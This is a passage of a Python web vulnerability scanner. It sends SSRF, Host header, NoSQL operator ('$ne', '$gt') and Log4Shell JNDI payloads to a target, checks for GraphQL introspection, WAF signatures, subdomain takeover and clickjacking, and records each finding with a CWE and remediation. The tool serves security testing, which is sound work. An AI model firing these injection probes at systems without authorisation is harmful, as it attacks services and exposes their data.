                                "Expired JWT token appears to be accepted. "
                                "Server may not be validating token expiry.",
                                evidence=f"exp: {exp}, now: {int(datetime.utcnow().timestamp())}",
                                remediation="Validate JWT expiry on every request. Reject expired tokens.",
                                cwe="CWE-613",
                            )
                    else:
                        self._add(
                            "JWT: No Expiry Claim", "Medium", self.base_url,
                            "JWT token has no 'exp' (expiry) claim — tokens never expire.",
                            evidence=f"Payload keys: {list(payload.keys())}",
                            remediation="Always include 'exp' claim in JWTs. Use short-lived tokens.",
                            cwe="CWE-613",
                        )
                except Exception:
                    pass

    # ── 11. SSRF DETECTION ────────────────────────────────────────────────────
    def scan_ssrf(self):
        self.progress("  [ADV] Testing SSRF (Server-Side Request Forgery)...")
        for page in self.crawl_data:
            url    = page.get("url", "")
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            # Test params that look like URLs
            ssrf_params = [p for p in params
                           if p.lower() in [s.lower() for s in SSRF_PARAMS]]

            for param in ssrf_params:
                for payload in SSRF_PAYLOADS[:4]:
                    test_url = self._inject_param(parsed, param, payload)
                    try:
                        resp = self.session.get(test_url, timeout=self.timeout,
                                                allow_redirects=True, verify=False)
                        if resp and any(ind in resp.text for ind in SSRF_INDICATORS):
                            self._add(
                                "SSRF — Server-Side Request Forgery", "Critical", url,
                                f"SSRF via parameter '{param}'. "
                                "Server fetched internal resource — cloud metadata or internal service.",
                                evidence=f"Payload: {payload} → response contains SSRF indicator.",
                                parameter=param, payload=payload,
                                remediation=(
                                    "Validate and whitelist allowed URL schemes and hosts. "
                                    "Block access to 169.254.169.254 (AWS/Azure IMDS). "
                                    "Use egress firewall rules."
                                ),
                                cwe="CWE-918",
                            )
                            break
                    except Exception:
                        pass
                    time.sleep(0.05)

    # ── 12. HOST HEADER INJECTION ─────────────────────────────────────────────
    def scan_host_header_injection(self):
        self.progress("  [ADV] Testing Host header injection...")
        for payload in HOST_INJECT_PAYLOADS:
            try:
                resp = self.session.get(
                    self.base_url,
                    headers={"Host": payload, "User-Agent": UA},
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True,
                )
                body = resp.text.lower() if resp else ""
                headers = {k.lower(): v for k, v in resp.headers.items()} if resp else {}

                # Check if injected host is reflected
                if payload.lower() in body or payload.lower() in str(headers):
                    self._add(
                        "Host Header Injection", "High", self.base_url,
                        f"Injected Host header '{payload}' is reflected in response. "
                        "Can be used for password reset poisoning, cache poisoning, or SSRF.",
                        evidence=f"Host: {payload} reflected in body/headers.",
                        payload=payload,
                        remediation=(
                            "Validate the Host header against a whitelist of allowed values. "
                            "Use absolute URLs in emails and redirects generated server-side."
                        ),
                        cwe="CWE-20",
                    )
                    break
            except Exception:
                pass
            time.sleep(0.05)

    # ── 13. NoSQL INJECTION ───────────────────────────────────────────────────
    def scan_nosql_injection(self):
        self.progress("  [ADV] Testing NoSQL injection...")
        for page in self.crawl_data:
            url    = page.get("url", "")
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param in params:
                orig_resp = self._get(url)
                orig_len  = len(orig_resp.text) if orig_resp else 0

                # URL encoded NoSQL operators
                for payload in ['{"$ne":null}', '{"$gt":""}']:
                    test_url = self._inject_param(parsed, param, payload)
                    resp = self._get(test_url)
                    if not resp:
                        continue
                    # Different response = potential injection
                    if abs(len(resp.text) - orig_len) > 100 and resp.status_code == 200:
                        self._add(
                            "NoSQL Injection", "High", url,
                            f"Possible NoSQL injection in parameter '{param}'. "
                            "MongoDB operator payload caused different response — "
                            "may allow authentication bypass or data extraction.",
                            evidence=f"Payload '{payload}' → length delta {abs(len(resp.text)-orig_len)}B",
                            parameter=param, payload=payload,
                            remediation=(
                                "Validate and sanitize all inputs. "
                                "Use typed query builders. "
                                "Reject $ and . characters in field names."
                            ),
                            cwe="CWE-943",
                        )
                        break
                    time.sleep(0.04)

    # ── 14. LOG4J / JNDI INJECTION ────────────────────────────────────────────
    def scan_log4j(self):
        self.progress("  [ADV] Testing Log4Shell / JNDI injection...")
        # Inject into all headers and params
        for payload in LOG4J_PAYLOADS[:2]:
            headers_to_test = {
                "X-Api-Version":    payload,
                "User-Agent":       payload,
                "X-Forwarded-For":  payload,
                "Referer":          payload,
                "X-Real-IP":        payload,
                "Accept-Language":  payload,
            }
            for header_name, header_val in headers_to_test.items():
                try:
                    resp = self.session.get(
                        self.base_url,
                        headers={**REQUEST_HEADERS, header_name: header_val},
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=False,
                    )
                    # Can't directly confirm without DNS callback — flag as potential
                    server_header = resp.headers.get("Server", "").lower() if resp else ""
                    x_powered_by = resp.headers.get("X-Powered-By", "").lower() if resp else ""
                    is_java = any(x in (server_header + x_powered_by) for x in ("tomcat", "jboss", "glassfish", "weblogic", "jetty", "java", "jvm"))
                    
                    if resp and resp.status_code not in (400, 403) and (is_java or not server_header):
                        self._add(
                            "Log4Shell / JNDI Injection (Potential)", "Critical",
                            self.base_url,
                            f"Log4j JNDI payload injected via '{header_name}' header. "
                            "If server uses Log4j 2.x (< 2.15.0), remote code execution is possible. "
                            "Confirm with DNS callback server (Burp Collaborator / interactsh).",
                            evidence=f"Header: {header_name}: {payload[:80]} → HTTP {resp.status_code}",
                            payload=payload[:80],
                            remediation=(
                                "Upgrade Log4j to 2.17.1+. "
                                "Set log4j2.formatMsgNoLookups=true. "
                                "Block JNDI lookups via WAF rules."
                            ),
                            cwe="CWE-502",
                        )
                        break
                except Exception:
                    pass
                time.sleep(0.03)

    # ── 15. GraphQL INTROSPECTION ─────────────────────────────────────────────
    def scan_graphql(self):
        self.progress("  [ADV] Checking GraphQL introspection...")
        parsed  = urlparse(self.base_url)
        base    = f"{parsed.scheme}://{parsed.netloc}"
        endpoints = ["/graphql", "/graphiql", "/api/graphql", "/query", "/gql"]

        for path in endpoints:
            url  = base + path
            resp = self._post(url, json_data={"query": "{__schema{types{name}}}"})
            if not resp:
                continue
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if "__schema" in str(data) or "types" in str(data):
                        self._add(
                            "GraphQL Introspection Enabled", "Medium", url,
                            "GraphQL introspection is enabled in production. "
                            "Attackers can enumerate the entire API schema, types, and queries.",
                            evidence=f"Introspection query returned schema data.",
                            payload=GRAPHQL_INTROSPECT_QUERY,
                            remediation=(
                                "Disable introspection in production. "
                                "Add: introspection: false in GraphQL config. "
                                "Use persisted queries."
                            ),
                            cwe="CWE-200",
                        )
                except Exception:
                    pass
            time.sleep(0.05)

    # ── 16. WAF DETECTION ─────────────────────────────────────────────────────
    def detect_waf(self):
        self.progress("  [ADV] Detecting WAF/CDN protection...")
        waf_signatures = {
            "Cloudflare":    ["cf-ray", "cloudflare", "__cfduid"],
            "AWS WAF":       ["x-amzn-requestid", "x-amz-cf-id"],
            "Akamai":        ["akamai", "x-akamai-transformed", "x-check-cacheable"],
            "Sucuri":        ["x-sucuri-id", "x-sucuri-cache", "sucuri"],
            "ModSecurity":   ["mod_security", "modsecurity"],
            "Imperva/Incapsula": ["incap_ses", "visid_incap", "x-iinfo"],
            "Barracuda":     ["barra_counter_session", "barracuda"],
            "F5 BIG-IP":     ["bigipserver", "f5-"],
            "Fastly":        ["x-served-by", "fastly"],
        }

        resp = self._get(self.base_url)
        if not resp:
            return

        headers_str = str(resp.headers).lower()
        body_str    = resp.text[:3000].lower()
        detected    = []

        for waf_name, sigs in waf_signatures.items():
            if any(sig.lower() in headers_str or sig.lower() in body_str for sig in sigs):
                detected.append(waf_name)

        if detected:
            self._add(
                f"WAF / CDN Detected: {', '.join(detected)}", "Info",
                self.base_url,
                f"Web Application Firewall / CDN detected: {', '.join(detected)}. "
                "WAF may filter some vulnerability tests — some findings may be false negatives.",
                evidence=f"WAF signatures found in headers/body.",
                remediation="Ensure WAF rules are updated and logging is enabled.",
                cwe="CWE-16",
            )

    # ── 17. SUBDOMAIN TAKEOVER INDICATORS ─────────────────────────────────────
    def scan_subdomain_takeover(self):
        self.progress("  [ADV] Checking subdomain takeover indicators...")
        resp = self._get(self.base_url)
        if not resp:
            return
        body = resp.text

        for service, patterns in TAKEOVER_FINGERPRINTS.items():
            for pattern in patterns:
                if pattern.lower() in body.lower():
                    self._add(
                        f"Subdomain Takeover Risk: {service}", "Critical",
                        self.base_url,
                        f"Response contains '{pattern}' — fingerprint of unclaimed {service} resource. "
                        "Domain may point to a service that has been deprovisioned.",
                        evidence=f"Fingerprint: '{pattern}'",
                        remediation=(
                            f"Reclaim the {service} resource or remove the DNS record. "
                            "Audit DNS CNAME records regularly."
                        ),
                        cwe="CWE-350",
                    )

    # ── 18. CLICKJACKING ──────────────────────────────────────────────────────
    def scan_clickjacking(self):
        resp = self._get(self.base_url)
        if not resp:
            return
        headers = {k.lower(): v for k, v in resp.headers.items()}
        xfo = headers.get("x-frame-options", "")
        csp = headers.get("content-security-policy", "")

        if not xfo and "frame-ancestors" not in csp:
            self._add(
                "Clickjacking Vulnerability", "Medium", self.base_url,
                "No X-Frame-Options or CSP frame-ancestors directive. "
                "Page can be embedded in an iframe on a malicious site to perform clickjacking attacks.",
                evidence="X-Frame-Options: (absent), frame-ancestors: (absent in CSP)",
                remediation=(
                    "Add: X-Frame-Options: DENY\n"
                    "Or in CSP: Content-Security-Policy: frame-ancestors 'none'"
                ),
                cwe="CWE-1021",
            )
        elif xfo.upper() not in ("DENY", "SAMEORIGIN"):
            self._add(
                "Weak Clickjacking Protection", "Low", self.base_url,
                f"X-Frame-Options: '{xfo}' is set but the value may be permissive.",
                evidence=f"X-Frame-Options: {xfo}",
                remediation="Use X-Frame-Options: DENY or SAMEORIGIN.",
                cwe="CWE-1021",
            )

    # ── MAIN RUN ──────────────────────────────────────────────────────────────
    def run(self) -> list:
        self.progress("  [ADV] === Advanced Checks Starting ===")
        total_before = 0

        steps = [
            ("Sensitive Files",      self.scan_sensitive_files),
            ("Cookie Security",      self.scan_cookie_security),
            ("SSL/TLS",              self.scan_ssl),
            ("HTTP Methods",         self.scan_http_methods),
            ("Command Injection",    self.scan_command_injection),
            ("Path Traversal",       self.scan_path_traversal),
            ("XXE",                  self.scan_xxe),
            ("Broken Auth",          self.scan_broken_auth),
            ("CORS",                 self.scan_cors),
            ("JWT",                  self.scan_jwt),
            ("SSRF",                 self.scan_ssrf),
            ("Host Header",          self.scan_host_header_injection),
            ("NoSQL Injection",      self.scan_nosql_injection),
            ("Log4j/JNDI",           self.scan_log4j),
            ("GraphQL",              self.scan_graphql),
            ("WAF Detection",        self.detect_waf),
            ("Subdomain Takeover",   self.scan_subdomain_takeover),
            ("Clickjacking",         self.scan_clickjacking),
        ]

        for name, fn in steps:
            try:
                before = len(self.findings)
                fn()
                new = len(self.findings) - before
                if new:
                    self.progress(f"  [ADV] {name}: {new} finding(s)")
            except Exception as e:
                logger.debug(f"[ADV] {name} error: {e}")

        self.progress(f"  [ADV] === Advanced Checks Complete: {len(self.findings)} findings ===")
        return self.findings
